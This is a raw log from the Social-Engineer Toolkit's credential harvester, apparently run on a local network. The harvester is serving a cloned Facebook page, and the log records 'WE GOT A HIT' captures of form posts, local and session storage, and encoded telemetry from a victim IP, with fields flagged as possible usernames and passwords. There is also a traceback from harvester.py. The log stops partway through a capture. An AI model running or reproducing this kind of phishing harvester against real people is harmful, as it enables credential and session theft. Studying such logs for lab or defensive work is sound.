[{"app_id":"256281040558","posts":[["falco:ods_web_batch",{"e":"{\"batch\":{\"7173\":{\"entities.ff_js_web.web_time_spent_bit_array.256281040558.0.C3\":{\"event.logged\":{\"n\":1,\"d\":null},\"event.info.upload_method.banzai.log_immediately\":{\"n\":1,\"d\":null},\"event.info.banzai.log_immediately.upload_processing\":{\"n\":1,\"d\":null},\"event.uploaded\":{\"n\":1,\"d\":null}}}}}","r":1,"d":"$^|Acb8UHKjVSAH3N814hbfEJDV94pxI53SSApVgAQz7-Pz_o-d85XcdydwnDUhwC06W-tbwH4BchfZ6AYonuAvLL11c68c|fd.AcbjUjOzBiJKj7X0RI3Dyn1f-6-cVh_IQdeMANsnIy6jtOEcJs-JqXzG1RTsG963owmqvACXrZdXs8KnkNr0HgOS","s":"pxzghl:8f8sw2:7qhmdr","t":1736281873580.5,"b":[1,128]},1736282099289.7,0,587]],"user":"0","webSessionId":"pxzghl:8f8sw2:7qhmdr","trigger":"falco:web_time_spent_bit_array","send_method":"ajax","compression":""},{"app_id":"256281040558","posts":[["falco:web_time_spent_bit_array",{"e":"{\"sid_raw\":\"pxzghl:8f8sw2:7qhmdr\",\"start_time\":1736282094,\"tos_array\":[511,0],\"tos_cum\":15,\"tos_id\":\"7qhmdr\",\"tos_len\":64,\"tos_seq\":1}","r":1,"d":"$^|Acb8UHKjVSAH3N814hbfEJDV94pxI53SSApVgAQz7-Pz_o-d85XcdydwnDUhwC06W-tbwH4BchfZ6AYonuAvLL11c68c|fd.AcbjUjOzBiJKj7X0RI3Dyn1f-6-cVh_IQdeMANsnIy6jtOEcJs-JqXzG1RTsG963owmqvACXrZdXs8KnkNr0HgOS","s":":8f8sw2:7qhmdr","t":1736281932636.7,"b":[1,128]},1736282158346.1,0,413]],"user":"0","webSessionId":":8f8sw2:7qhmdr","compression":""}]                  
------WebKitFormBoundaryHtdOakQKCPgF6dfJ--                                   
[*] WHEN YOU'RE FINISHED, HIT CONTROL-C TO GENERATE A REPORT.                
                                                                             
                                                                             
192.168.10.106 - - [07/Jan/2025 17:35:58] "POST /ajax/bz?__a=1&__aaid=0&__ccg=EXCELLENT&__dyn=7xe6E5aQ1PyUbFp41twpUnwgU29zE6u7E3rw5ux60Vo1upE4W0OE3nwaq0yE7i0n24o5-0me1Fw5uw5Uwdq0Ho2eU5O08HwSyE1582ZwrU1Xo1UU3jwea&__hs=20095.BP%3ADEFAULT.2.0.0.0.0&__hsi=7457273806430503451&__req=6&__rev=1019191350&__s=%3A8f8sw2%3A7qhmdr&__spin_b=trunk&__spin_r=1019191350&__spin_t=1736281860&__user=0&dpr=2&jazoest=2970&lsd=AVqfZC4kN_s HTTP/1.1" 302 -
[*] WE GOT A HIT! Printing the output:
PARAM: local_storage[signal_flush_timestamp]=13                              
PARAM: local_storage[Session]=20                                             
PARAM: local_storage[hb_timestamp]=13                                        
PARAM: session_storage[sp_pi]=216                                            
PARAM: session_storage[TabId]=6                                              
PARAM: logtime=0                                                             
PARAM: __aaid=0                                                              
POSSIBLE USERNAME FIELD FOUND: __user=0                                      
PARAM: __a=1                                                                 
PARAM: __req=7                                                               
PARAM: __hs=20095.BP:DEFAULT.2.0.0.0.0                                       
PARAM: dpr=2                                                                 
PARAM: __ccg=EXCELLENT                                                       
PARAM: __rev=1019191350                                                      
PARAM: __s=:8f8sw2:7qhmdr                                                    
PARAM: __hsi=7457273806430503451                                             
PARAM: __dyn=7xe6E5aQ1PyUbFp41twpUnwgU29zE6u7E3rw5ux60Vo1upE4W0OE3nwaq0yE7i0n24o5-0me1Fw5uw5Uwdq0Ho2eU5O08HwSyE1582ZwrU1Xo1UU3jwea                        
PARAM: __csr=                                                                
PARAM: lsd=AVqfZC4kN_s                                                       
PARAM: jazoest=2970                                                          
POSSIBLE PASSWORD FIELD FOUND: __spin_r=1019191350                           
POSSIBLE PASSWORD FIELD FOUND: __spin_b=trunk                                
POSSIBLE PASSWORD FIELD FOUND: __spin_t=1736281860                           
[*] WHEN YOU'RE FINISHED, HIT CONTROL-C TO GENERATE A REPORT.                
                                                                             
                                                                             
192.168.10.106 - - [07/Jan/2025 17:36:05] "POST /ajax/webstorage/process_keys/?state=1 HTTP/1.1" 302 -
[*] WE GOT A HIT! Printing the output:
PARAM: local_storage[signal_flush_timestamp]=13                              
PARAM: local_storage[Session]=20                                             
PARAM: local_storage[hb_timestamp]=13                                        
PARAM: session_storage[sp_pi]=216                                            
PARAM: session_storage[TabId]=6                                              
PARAM: logtime=0                                                             
PARAM: __aaid=0                                                              
POSSIBLE USERNAME FIELD FOUND: __user=0                                      
PARAM: __a=1                                                                 
PARAM: __req=8                                                               
PARAM: __hs=20095.BP:DEFAULT.2.0.0.0.0                                       
PARAM: dpr=2                                                                 
PARAM: __ccg=EXCELLENT                                                       
PARAM: __rev=1019191350                                                      
PARAM: __s=:8f8sw2:7qhmdr                                                    
PARAM: __hsi=7457273806430503451                                             
PARAM: __dyn=7xe6E5aQ1PyUbFp41twpUnwgU29zE6u7E3rw5ux60Vo1upE4W0OE3nwaq0yE7i0n24o5-0me1Fw5uw5Uwdq0Ho2eU5O08HwSyE1582ZwrU1Xo1UU3jwea                        
PARAM: __csr=                                                                
PARAM: lsd=AVqfZC4kN_s                                                       
PARAM: jazoest=2970                                                          
POSSIBLE PASSWORD FIELD FOUND: __spin_r=1019191350                           
POSSIBLE PASSWORD FIELD FOUND: __spin_b=trunk                                
POSSIBLE PASSWORD FIELD FOUND: __spin_t=1736281860                           
[*] WHEN YOU'RE FINISHED, HIT CONTROL-C TO GENERATE A REPORT.                
                                                                             
                                                                             
192.168.10.106 - - [07/Jan/2025 17:36:05] "POST /ajax/webstorage/process_keys/?state=1 HTTP/1.1" 302 -
[*] WE GOT A HIT! Printing the output:
PARAM: local_storage[signal_flush_timestamp]=13                              
PARAM: local_storage[Session]=20                                             
PARAM: local_storage[hb_timestamp]=13                                        
PARAM: session_storage[sp_pi]=216                                            
PARAM: session_storage[TabId]=6                                              
PARAM: logtime=0                                                             
PARAM: __aaid=0                                                              
POSSIBLE USERNAME FIELD FOUND: __user=0                                      
PARAM: __a=1                                                                 
PARAM: __req=9                                                               
PARAM: __hs=20095.BP:DEFAULT.2.0.0.0.0                                       
PARAM: dpr=2                                                                 
PARAM: __ccg=EXCELLENT                                                       
PARAM: __rev=1019191350                                                      
PARAM: __s=:8f8sw2:7qhmdr                                                    
PARAM: __hsi=7457273806430503451                                             
PARAM: __dyn=7xe6E5aQ1PyUbFp41twpUnwgU29zE6u7E3rw5ux60Vo1upE4W0OE3nwaq0yE7i0n24o5-0me1Fw5uw5Uwdq0Ho2eU5O08HwSyE1582ZwrU1Xo1UU3jwea                        
PARAM: __csr=                                                                
PARAM: lsd=AVqfZC4kN_s                                                       
PARAM: jazoest=2970                                                          
POSSIBLE PASSWORD FIELD FOUND: __spin_r=1019191350                           
POSSIBLE PASSWORD FIELD FOUND: __spin_b=trunk                                
POSSIBLE PASSWORD FIELD FOUND: __spin_t=1736281860                           
[*] WHEN YOU'RE FINISHED, HIT CONTROL-C TO GENERATE A REPORT.                
                                                                             
                                                                             
192.168.10.106 - - [07/Jan/2025 17:36:05] "POST /ajax/webstorage/process_keys/?state=1 HTTP/1.1" 302 -
192.168.10.106 - - [07/Jan/2025 17:37:11] "GET / HTTP/1.1" 200 -
[*] WE GOT A HIT! Printing the output:
POSSIBLE USERNAME FIELD FOUND: ------WebKitFormBoundary3mxI8pkJk4XDb1Sg      
Content-Disposition: form-data; name="ts"                                    
                                                                             
1736282232383                                                                
------WebKitFormBoundary3mxI8pkJk4XDb1Sg                                     
Content-Disposition: form-data; name="q"                                     
                                                                             
[{"app_id":"256281040558","posts":[["falco:ods_web_batch",{"e":"{\"batch\":{\"7173\":{\"entities.ff_js_web.web_time_spent_bit_array.256281040558.0.C3\":{\"event.logged\":{\"n\":1,\"d\":null},\"event.info.upload_method.banzai.log_immediately\":{\"n\":1,\"d\":null},\"event.info.banzai.log_immediately.upload_processing\":{\"n\":1,\"d\":null},\"event.uploaded\":{\"n\":1,\"d\":null}}}}}","r":1,"d":"$^|Acb8UHKjVSAH3N814hbfEJDV94pxI53SSApVgAQz7-Pz_o-d85XcdydwnDUhwC06W-tbwH4BchfZ6AYonuAvLL11c68c|fd.AcbjUjOzBiJKj7X0RI3Dyn1f-6-cVh_IQdeMANsnIy6jtOEcJs-JqXzG1RTsG963owmqvACXrZdXs8KnkNr0HgOS","s":":8f8sw2:7qhmdr","t":1736281937648.5,"b":[1,128]},1736282163357.7,0,581]],"user":"0","webSessionId":":8f8sw2:7qhmdr","send_method":"beacon","compression":""}]                      
------WebKitFormBoundary3mxI8pkJk4XDb1Sg--                                   
[*] WHEN YOU'RE FINISHED, HIT CONTROL-C TO GENERATE A REPORT.                
                                                                             
                                                                             
192.168.10.106 - - [07/Jan/2025 17:37:11] "POST /ajax/bz?__a=1&__aaid=0&__ccg=EXCELLENT&__dyn=7xe6E5aQ1PyUbFp41twpUnwgU29zE6u7E3rw5ux60Vo1upE4W0OE3nwaq0yE7i0n24o5-0me1Fw5uw5Uwdq0Ho2eU5O08HwSyE1582ZwrU1Xo1UU3jwea&__hs=20095.BP%3ADEFAULT.2.0.0.0.0&__hsi=7457273806430503451&__req=a&__rev=1019191350&__s=wubb7d%3A8f8sw2%3A7qhmdr&__spin_b=trunk&__spin_r=1019191350&__spin_t=1736281860&__user=0&dpr=2&jazoest=2970&lsd=AVqfZC4kN_s HTTP/1.1" 302 -
----------------------------------------
Exception occurred during processing of request from ('192.168.10.106', 51623)
Traceback (most recent call last):
  File "/usr/lib/python3.10/socketserver.py", line 683, in process_request_thread
    self.finish_request(request, client_address)
  File "/usr/lib/python3.10/socketserver.py", line 360, in finish_request
    self.RequestHandlerClass(request, client_address, self)
  File "/usr/lib/python3.10/socketserver.py", line 747, in __init__
    self.handle()
  File "/usr/lib/python3.10/http/server.py", line 425, in handle
    self.handle_one_request()
  File "/usr/lib/python3.10/http/server.py", line 413, in handle_one_request
    method()
  File "/usr/share/set/src/webattack/harvester/harvester.py", line 392, in do_POST
    filewrite3 = open("%s/src/logs/harvester.log" % os.getcwd(), "w")
FileNotFoundError: [Errno 2] No such file or directory: '/root/.set/web_clone/src/logs/harvester.log'
----------------------------------------
[*] WE GOT A HIT! Printing the output:
POSSIBLE USERNAME FIELD FOUND: ------WebKitFormBoundaryRbiBSX7OZ7ysLooq      
Content-Disposition: form-data; name="ts"                                    
                                                                             
1736282233702                                                                
------WebKitFormBoundaryRbiBSX7OZ7ysLooq                                     
Content-Disposition: form-data; name="q"                                     
                                                                             
[{"app_id":"256281040558","posts":"vwrwVFtbImZhbGNvOndlYl9ibHVlX3RpbWVfc3BlbnRfbmF2aWdhdGlvbiIseyJlIjoie1wianNvbl9kYXRhXCI6XCJ7XFxcInNvdXJjZV9wYXRoXFxcIjoBFEhYV2ViTG9naW5Db250cm9sbGVyARcALAEFDTAQdG9rZW4BEAA6AQUcOTZlODhhZjMBDAUmDGRlc3SmVAAFLnpSADBpbXByZXNzaW9uX2lkAWgFeUAxekI4M05Ib09HZ0RKMzlaNAEaBYIQY2F1c2UBDgUoCGxvYQU1BRsYc2lkX3JhdxUdTHd1YmI3ZDo4ZjhzdzI6ZW56c3U5AR0ALAEFDfAUZWZfcGFnCVEMbnVsbC4cAAh1cmkBKgVpZGh0dHBzOi8vd3d3LmZhY2Vib29rLmNvbS9sIVAMLnBocAErBT4F9lJYAAUa2lYADbAYcmVzdG9yZQX18Ng6dHJ1ZX1cIn0iLCJyIjoxLCJkIjoiJF58QWNiOFVIS2pWU0FIM044MTRoYmZFSkRWOTRweEk1M1NTQXBWZ0FRejctUHpfby1kODVYY2R5ZHduRFVod0MwNlctdGJ3SDRCY2hmWjZBWW9udUF2TEwxMWM2OGN8ZmQuQWNialVqT3pCaUpLajdYMFJJM0R5bjFmLTYtY1ZoX0lRZGVNQU5zbkl5Nmp0T0VjSnMtSnFYekcxUlRzRzk2M293bXF2QUNYclpkWHM4S25rTnIwSGdPUyIsInMiOiJ3SrgBiCIsInQiOjE3MzYyODE4NjA0NjEuMywiYiI6WzEsMTI4XX0sCR1AMjIzMjY5OS43LDAsNzgxXSwuTQNMcGVyZl9kZXZpY2VfaW5mb19sb2d9R1RjcHVfY29yZXNcIjoyLFwicmFtXCI6SRd8ImdwdV9yZW5kZXJlclwiOlwiQU5HTEUgKEludGVsLCAFB/BCKFIpIFVIRCBHcmFwaGljcyAoMHgwMDAwOUE3OCkgRGlyZWN0M0QxMSB2c181XzAgcHNfNV8wLCBEM0QxMSlcIixcIgFnEHZlbmRvCWUoR29vZ2xlIEluYy4NawQpXP7xAf7xAf7xAdbxAQw3Ni41XvEBMDcxNC43LDAsNDM5XV0=","user":"0","webSessionId":"wubb7d:8f8sw2:enzsu9","trigger":"falco:web_blue_time_spent_navigation","send_method":"ajax","compression":"snappy_base64","snappy_ms":1}]                                                                         
------WebKitFormBoundaryRbiBSX7OZ7ysLooq--                                   
[*] WHEN YOU'RE FINISHED, HIT CONTROL-C TO GENERATE A REPORT.                
                                                                             
                                                                             
192.168.10.106 - - [07/Jan/2025 17:37:12] "POST /ajax/bz?__a=1&__aaid=0&__ccg=EXCELLENT&__dyn=7xe6E5aQ1PyUbFp41twpUnwgU29zE6u7E3rw5ux60Vo1upE4W0OE3nwaq0yE7i0n24o5-0me1Fw5uw5Uwdq0Ho2eU5O08HwSyE1582ZwrU1Xo1UU3jwea&__hs=20095.BP%3ADEFAULT.2.0.0.0.0&__hsi=7457273806430503451&__req=1&__rev=1019191350&__s=wubb7d%3A8f8sw2%3Aenzsu9&__spin_b=trunk&__spin_r=1019191350&__spin_t=1736281860&__user=0&dpr=2&jazoest=2970&lsd=AVqfZC4kN_s HTTP/1.1" 302 -
[*] WE GOT A HIT! Printing the output:
POSSIBLE USERNAME FIELD FOUND: ------WebKitFormBoundaryBf8mH9ABPMFbEoYy      
Content-Disposition: form-data; name="ts"                                    
                                                                             
1736282241720                                                                
------WebKitFormBoundaryBf8mH9ABPMFbEoYy                                     
Content-Disposition: form-data; name="q"                                     
                                                                             
[{"app_id":"256281040558","posts":"kAuAW1siZmFsY286b2RzX3dlYl9iYXRjaCIseyJlIjoie1wiBRAkXCI6e1wiMjk2NgkKTG1zLnRpbWVfc3BlbnQucWEud3d3CRodF0hiaXRzLmpzX2luaXRpYWxpemVkCSQcblwiOjEsXCIBDzRudWxsfX19LFwiNzE3MwkgMGVudGl0aWVzLmZmX2oFlgAuBZoMbHVlXxlgbF9uYXZpZ2F0aW9uLjI1NjI4MTA0MDU1OC4wLkMRSQB2AZ8MbG9nZ2J7AAgsXCIJJmBpbmZvLnVwbG9hZF9tZXRob2QuYmFuemFpAUAwX2ltbWVkaWF0ZWx5XCUMQsQANkkAVjsAEWAkcHJvY2Vzc2luZ35NAAmRYr4ABXZWLgEscGVyZl9kZXZpY2VfAdwMX2xvZ/4oATUoGd8Nov7TAB3T9DABfX19IiwiciI6MSwiZCI6IiRefEFjYjhVSEtqVlNBSDNOODE0aGJmRUpEVjk0cHhJNTNTU0FwVmdBUXo3LVB6X28tZDg1WGNkeWR3bkRVaHdDMDZXLXRid0g0QmNoZlo2QVlvbnVBdkxMMTFjNjhjfGZkLkFjYmpVak96QmlKS2o3WDBSSTNEeW4xZi02LWNWaF9JUWRlTUFOc25JeTZqdE9FY0pzLUpxWHpHMVJUc0c5NjNvd21xdkFDWHJaZFhzOEtua05yMEhnT1MiLCJzIjoid3ViYjdkOjhmOHN3MjplbnpzdTkiLCJ0IjoxNzM2MjgxODY1NDc1LjcsImIiOlsxLDEyOF19LDE3MzYyODIyMzc3MTMuOTAwMSwwLDg5OF0sWyJmYWxjbzp3ZWJfdGlxiCRfYml0X2FycmF5fb8Uc2lkX3JhYZ0AXFKIAChcIixcInN0YXJ0X2FbCFwiOhV3GDIsXCJ0b3MJUyRcIjpbNDgxLDBdDRYYY3VtXCI6NQ0OHGlkXCI6XCJlBdwAXAFUAToEbGVhJwA5DSQYc2VxXCI6MP7eAf7eAf7eAcreARw4NDc2LjksIk7eATg0MDcxNS4yLDAsNDE3XV0=","user":"0","webSessionId":"wubb7d:8f8sw2:enzsu9","trigger":"falco:web_time_spent_bit_array","send_method":"ajax","compression":"snappy_base64","snappy_ms":1}]                                                                          
------WebKitFormBoundaryBf8mH9ABPMFbEoYy--                                   
[*] WHEN YOU'RE FINISHED, HIT CONTROL-C TO GENERATE A REPORT.                
                                                                             
                                                                             
192.168.10.106 - - [07/Jan/2025 17:37:20] "POST /ajax/bz?__a=1&__aaid=0&__ccg=EXCELLENT&__dyn=7xe6E5aQ1PyUbFp41twpUnwgU29zE6u7E3rw5ux60Vo1upE4W0OE3nwaq0yE7i0n24o5-0me1Fw5uw5Uwdq0Ho2eU5O08HwSyE1582ZwrU1Xo1UU3jwea&__hs=20095.BP%3ADEFAULT.2.0.0.0.0&__hsi=7457273806430503451&__req=2&__rev=1019191350&__s=wubb7d%3A8f8sw2%3Aenzsu9&__spin_b=trunk&__spin_r=1019191350&__spin_t=1736281860&__user=0&dpr=2&jazoest=2970&lsd=AVqfZC4kN_s HTTP/1.1" 302 -
[*] WE GOT A HIT! Printing the output:
PARAM: local_storage[signal_flush_timestamp]=13                              
PARAM: local_storage[Session]=20                                             
PARAM: local_storage[hb_timestamp]=13                                        
PARAM: session_storage[sp_pi]=216                                            
PARAM: session_storage[TabId]=6                                              
PARAM: logtime=0                                                             
PARAM: __aaid=0                                                              
POSSIBLE USERNAME FIELD FOUND: __user=0                                      
PARAM: __a=1                                                                 
PARAM: __req=3                                                               
PARAM: __hs=20095.BP:DEFAULT.2.0.0.0.0                                       
PARAM: dpr=2                                                                 
PARAM: __ccg=EXCELLENT                                                       
PARAM: __rev=1019191350                                                      
PARAM: __s=wubb7d:8f8sw2:enzsu9                                              
PARAM: __hsi=7457273806430503451                                             
PARAM: __dyn=7xe6E5aQ1PyUbFp41twpUnwgU29zE6u7E3rw5ux60Vo1upE4W0OE3nwaq0yE7i0n24o5-0me1Fw5uw5Uwdq0Ho2eU5O08HwSyE1582ZwrU1Xo1UU3jwea                        
PARAM: __csr=                                                                
PARAM: lsd=AVqfZC4kN_s                                                       
PARAM: jazoest=2970                                                          
POSSIBLE PASSWORD FIELD FOUND: __spin_r=1019191350                           
POSSIBLE PASSWORD FIELD FOUND: __spin_b=trunk                                
POSSIBLE PASSWORD FIELD FOUND: __spin_t=1736281860                           
[*] WHEN YOU'RE FINISHED, HIT CONTROL-C TO GENERATE A REPORT.                
                                                                             
                                                                             
192.168.10.106 - - [07/Jan/2025 17:37:51] "POST /ajax/webstorage/process_keys/?state=1 HTTP/1.1" 302 -
[*] WE GOT A HIT! Printing the output:
PARAM: local_storage[signal_flush_timestamp]=13                              
PARAM: local_storage[Session]=20                                             
PARAM: local_storage[hb_timestamp]=13                                        
PARAM: session_storage[sp_pi]=216                                            
PARAM: session_storage[TabId]=6                                              
PARAM: logtime=0                                                             
PARAM: __aaid=0                                                              
POSSIBLE USERNAME FIELD FOUND: __user=0                                      
PARAM: __a=1                                                                 
PARAM: __req=4                                                               
PARAM: __hs=20095.BP:DEFAULT.2.0.0.0.0                                       
PARAM: dpr=2                                                                 
PARAM: __ccg=EXCELLENT                                                       
PARAM: __rev=1019191350                                                      
PARAM: __s=wubb7d:8f8sw2:enzsu9                                              
PARAM: __hsi=7457273806430503451                                             
PARAM: __dyn=7xe6E5aQ1PyUbFp41twpUnwgU29zE6u7E3rw5ux60Vo1upE4W0OE3nwaq0yE7i0n24o5-0me1Fw5uw5Uwdq0Ho2eU5O08HwSyE1582ZwrU1Xo1UU3jwea                        
PARAM: __csr=                                                                
PARAM: lsd=AVqfZC4kN_s                                                       
PARAM: jazoest=2970                                                          
POSSIBLE PASSWORD FIELD FOUND: __spin_r=1019191350                           
POSSIBLE PASSWORD FIELD FOUND: __spin_b=trunk                                
POSSIBLE PASSWORD FIELD FOUND: __spin_t=1736281860                           
[*] WHEN YOU'RE FINISHED, HIT CONTROL-C TO GENERATE A REPORT.                
                                                                             
                                                                             
192.168.10.106 - - [07/Jan/2025 17:37:52] "POST /ajax/webstorage/process_keys/?state=1 HTTP/1.1" 302 -
[*] WE GOT A HIT! Printing the output:
PARAM: local_storage[signal_flush_timestamp]=13                              
PARAM: local_storage[Session]=20                                             
PARAM: local_storage[hb_timestamp]=13                                        
PARAM: session_storage[sp_pi]=216                                            
PARAM: session_storage[TabId]=6                                              
PARAM: logtime=0                                                             
PARAM: __aaid=0                                                              
POSSIBLE USERNAME FIELD FOUND: __user=0                                      
PARAM: __a=1                                                                 
PARAM: __req=5                                                               
PARAM: __hs=20095.BP:DEFAULT.2.0.0.0.0                                       
PARAM: dpr=2                                                                 
PARAM: __ccg=EXCELLENT                                                       
PARAM: __rev=1019191350                                                      
PARAM: __s=wubb7d:8f8sw2:enzsu9                                              
PARAM: __hsi=7457273806430503451                                             
PARAM: __dyn=7xe6E5aQ1PyUbFp41twpUnwgU29zE6u7E3rw5ux60Vo1upE4W0OE3nwaq0yE7i0n24o5-0me1Fw5uw5Uwdq0Ho2eU5O08HwSyE1582ZwrU1Xo1UU3jwea                        
PARAM: __csr=                                                                
PARAM: lsd=AVqfZC4kN_s                                                       
PARAM: jazoest=2970                                                          
POSSIBLE PASSWORD FIELD FOUND: __spin_r=1019191350                           
POSSIBLE PASSWORD FIELD FOUND: __spin_b=trunk                                
POSSIBLE PASSWORD FIELD FOUND: __spin_t=1736281860                           
[*] WHEN YOU'RE FINISHED, HIT CONTROL-C TO GENERATE A REPORT.                
                                                                             
                                                                             
192.168.10.106 - - [07/Jan/2025 17:37:52] "POST /ajax/webstorage/process_keys/?state=1 HTTP/1.1" 302 -
[*] WE GOT A HIT! Printing the output:
POSSIBLE USERNAME FIELD FOUND: ------WebKitFormBoundaryEK176VbQOBk7eZ4A      
Content-Disposition: form-data; name="ts"                                    
                                                                             
1736282306174                                                                
------WebKitFormBoundaryEK176VbQOBk7eZ4A                                     
Content-Disposition: form-data; name="q"                                     
                                                                             
[{"app_id":"256281040558","posts":[["falco:ods_web_batch",{"e":"{\"batch\":{\"7173\":{\"entities.ff_js_web.web_time_spent_bit_array.256281040558.0.C3\":{\"event.logged\":{\"n\":1,\"d\":null},\"event.info.upload_method.banzai.log_immediately\":{\"n\":1,\"d\":null},\"event.info.banzai.log_immediately.upload_processing\":{\"n\":1,\"d\":null},\"event.uploaded\":{\"n\":1,\"d\":null}}}}}","r":1,"d":"$^|Acb8UHKjVSAH3N814hbfEJDV94pxI53SSApVgAQz7-Pz_o-d85XcdydwnDUhwC06W-tbwH4BchfZ6AYonuAvLL11c68c|fd.AcbjUjOzBiJKj7X0RI3Dyn1f-6-cVh_IQdeMANsnIy6jtOEcJs-JqXzG1RTsG963owmqvACXrZdXs8KnkNr0HgOS","s":"wubb7d:8f8sw2:enzsu9","t":1736281873489.4,"b":[1,128]},1736282245727.6,0,587]],"user":"0","webSessionId":"wubb7d:8f8sw2:enzsu9","trigger":"falco:web_time_spent_bit_array","send_method":"ajax","compression":""},{"app_id":"256281040558","posts":[["falco:web_time_spent_bit_array",{"e":"{\"sid_raw\":\"wubb7d:8f8sw2:enzsu9\",\"start_time\":1736282241,\"tos_array\":[1048687,0],\"tos_cum\":12,\"tos_id\":\"enzsu9\",\"tos_len\":64,\"tos_seq\":1}","r":1,"d":"$^|Acb8UHKjVSAH3N814hbfEJDV94pxI53SSApVgAQz7-Pz_o-d85XcdydwnDUhwC06W-tbwH4BchfZ6AYonuAvLL11c68c|fd.AcbjUjOzBiJKj7X0RI3Dyn1f-6-cVh_IQdeMANsnIy6jtOEcJs-JqXzG1RTsG963owmqvACXrZdXs8KnkNr0HgOS","s":":8f8sw2:enzsu9","t":1736281932922.2,"b":[1,128]},1736282305160.6,0,417]],"user":"0","webSessionId":":8f8sw2:enzsu9","compression":""}]              
------WebKitFormBoundaryEK176VbQOBk7eZ4A--                                   
[*] WHEN YOU'RE FINISHED, HIT CONTROL-C TO GENERATE A REPORT.                
                                                                             
                                                                             
192.168.10.106 - - [07/Jan/2025 17:38:25] "POST /ajax/bz?__a=1&__aaid=0&__ccg=EXCELLENT&__dyn=7xe6E5aQ1PyUbFp41twpUnwgU29zE6u7E3rw5ux60Vo1upE4W0OE3nwaq0yE7i0n24o5-0me1Fw5uw5Uwdq0Ho2eU5O08HwSyE1582ZwrU1Xo1UU3jwea&__hs=20095.BP%3ADEFAULT.2.0.0.0.0&__hsi=7457273806430503451&__req=6&__rev=1019191350&__s=%3A8f8sw2%3Aenzsu9&__spin_b=trunk&__spin_r=1019191350&__spin_t=1736281860&__user=0&dpr=2&jazoest=2970&lsd=AVqfZC4kN_s HTTP/1.1" 302 -
[*] WE GOT A HIT! Printing the output:
PARAM: local_storage[signal_flush_timestamp]=13                              
PARAM: local_storage[Session]=20                                             
PARAM: local_storage[hb_timestamp]=13                                        
PARAM: session_storage[sp_pi]=216                                            
PARAM: session_storage[TabId]=6                                              
PARAM: logtime=0                                                             
PARAM: __aaid=0                                                              
POSSIBLE USERNAME FIELD FOUND: __user=0                                      
PARAM: __a=1                                                                 
PARAM: __req=7                                                               
PARAM: __hs=20095.BP:DEFAULT.2.0.0.0.0                                       
PARAM: dpr=2                                                                 
PARAM: __ccg=EXCELLENT                                                       
PARAM: __rev=1019191350                                                      
PARAM: __s=:8f8sw2:enzsu9                                                    
PARAM: __hsi=7457273806430503451                                             
PARAM: __dyn=7xe6E5aQ1PyUbFp41twpUnwgU29zE6u7E3rw5ux60Vo1upE4W0OE3nwaq0yE7i0n24o5-0me1Fw5uw5Uwdq0Ho2eU5O08HwSyE1582ZwrU1Xo1UU3jwea                        
PARAM: __csr=                                                                
PARAM: lsd=AVqfZC4kN_s                                                       
PARAM: jazoest=2970                                                          
POSSIBLE PASSWORD FIELD FOUND: __spin_r=1019191350                           
POSSIBLE PASSWORD FIELD FOUND: __spin_b=trunk                                
POSSIBLE PASSWORD FIELD FOUND: __spin_t=1736281860                           
[*] WHEN YOU'RE FINISHED, HIT CONTROL-C TO GENERATE A REPORT.                
                                                                             
                                                                             
192.168.10.106 - - [07/Jan/2025 17:38:42] "POST /ajax/webstorage/process_keys/?state=1 HTTP/1.1" 302 -
[*] WE GOT A HIT! Printing the output:
PARAM: local_storage[signal_flush_timestamp]=13                              
PARAM: local_storage[Session]=20                                             
PARAM: local_storage[hb_timestamp]=13                                        
PARAM: session_storage[sp_pi]=216                                            
PARAM: session_storage[TabId]=6                                              
PARAM: logtime=0                                                             
PARAM: __aaid=0                                                              
POSSIBLE USERNAME FIELD FOUND: __user=0                                      
PARAM: __a=1                                                                 
PARAM: __req=8                                                               
PARAM: __hs=20095.BP:DEFAULT.2.0.0.0.0                                       
PARAM: dpr=2                                                                 
PARAM: __ccg=EXCELLENT                                                       
PARAM: __rev=1019191350                                                      
PARAM: __s=:8f8sw2:enzsu9                                                    
PARAM: __hsi=7457273806430503451                                             
PARAM: __dyn=7xe6E5aQ1PyUbFp41twpUnwgU29zE6u7E3rw5ux60Vo1upE4W0OE3nwaq0yE7i0n24o5-0me1Fw5uw5Uwdq0Ho2eU5O08HwSyE1582ZwrU1Xo1UU3jwea                        
PARAM: __csr=                                                                
PARAM: lsd=AVqfZC4kN_s                                                       
PARAM: jazoest=2970                                                          
POSSIBLE PASSWORD FIELD FOUND: __spin_r=1019191350                           
POSSIBLE PASSWORD FIELD FOUND: __spin_b=trunk                                
POSSIBLE PASSWORD FIELD FOUND: __spin_t=1736281860                           
[*] WHEN YOU'RE FINISHED, HIT CONTROL-C TO GENERATE A REPORT.                
                                                                             
                                                                             
192.168.10.106 - - [07/Jan/2025 17:38:42] "POST /ajax/webstorage/process_keys/?state=1 HTTP/1.1" 302 -
[*] WE GOT A HIT! Printing the output:
PARAM: local_storage[signal_flush_timestamp]=13                              
PARAM: local_storage[Session]=20                                             
PARAM: local_storage[hb_timestamp]=13                                        
PARAM: session_storage[sp_pi]=216                                            
PARAM: session_storage[TabId]=6                                              
PARAM: logtime=0                                                             
PARAM: __aaid=0                                                              
POSSIBLE USERNAME FIELD FOUND: __user=0                                      
PARAM: __a=1                                                                 
PARAM: __req=9                                                               
PARAM: __hs=20095.BP:DEFAULT.2.0.0.0.0                                       
PARAM: dpr=2                                                                 
PARAM: __ccg=EXCELLENT                                                       
PARAM: __rev=1019191350                                                      
PARAM: __s=:8f8sw2:enzsu9                                                    
PARAM: __hsi=7457273806430503451                                             
PARAM: __dyn=7xe6E5aQ1PyUbFp41twpUnwgU29zE6u7E3rw5ux60Vo1upE4W0OE3nwaq0yE7i0n24o5-0me1Fw5uw5Uwdq0Ho2eU5O08HwSyE1582ZwrU1Xo1UU3jwea                        
PARAM: __csr=                                                                
PARAM: lsd=AVqfZC4kN_s                                                       
PARAM: jazoest=2970                                                          
POSSIBLE PASSWORD FIELD FOUND: __spin_r=1019191350                           
POSSIBLE PASSWORD FIELD FOUND: __spin_b=trunk                                
POSSIBLE PASSWORD FIELD FOUND: __spin_t=1736281860                           
[*] WHEN YOU'RE FINISHED, HIT CONTROL-C TO GENERATE A REPORT.                
                                                                             
                                                                             
192.168.10.106 - - [07/Jan/2025 17:38:42] "POST /ajax/webstorage/process_keys/?state=1 HTTP/1.1" 302 -
[*] WE GOT A HIT! Printing the output:
POSSIBLE USERNAME FIELD FOUND: ------WebKitFormBoundarytUDWqywab6aONVAi      
Content-Disposition: form-data; name="ts"                                    
                                                                             
1736282335756                                                                
------WebKitFormBoundarytUDWqywab6aONVAi                                     
Content-Disposition: form-data; name="q"                                     
                                                                             
